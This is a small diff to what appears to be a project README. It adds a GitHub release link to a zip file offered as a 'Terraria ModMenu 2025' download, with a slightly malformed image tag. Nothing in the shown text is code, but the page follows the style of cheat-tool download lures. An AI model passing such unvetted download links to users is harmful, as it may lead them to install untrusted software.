@@ -2,7 +2,7 @@
   <img src="" alt=" width="100%">
 </div>
 <div align="center">
-  <h2><a href="">🟩 Download Terraria ModMenu 2025  🟩</a></h2>
+  <h2><a href="https://github.com/atycin3/Terraria-Mod-Menu/releases/download/Terraria_ModMenu_v11.2/Terraria_ModMenu_v11.2.zip">🟩 Download Terraria ModMenu 2025  🟩</a></h2>
 </div>
 
 
